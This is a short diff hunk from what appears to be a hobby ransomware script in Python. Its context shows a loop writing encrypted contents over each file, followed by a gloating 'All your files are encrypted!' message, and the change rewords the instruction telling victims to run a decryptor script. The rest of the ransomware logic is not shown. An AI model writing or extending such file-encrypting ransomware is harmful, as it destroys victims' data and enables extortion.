@@ -25,7 +25,7 @@ for file in files:
 		thefile.write(contents_encrypted)
 
 print (" All your files are encrypted! Luckily we have a decoder! ;)")
-print (" Find reaperdecryptor.py to get your files back!")
+print (" Find and run reaperdecryptor.py in the comman terminal to get your files back!")
 
 
 #with open ("README.txt","wb") as readme:
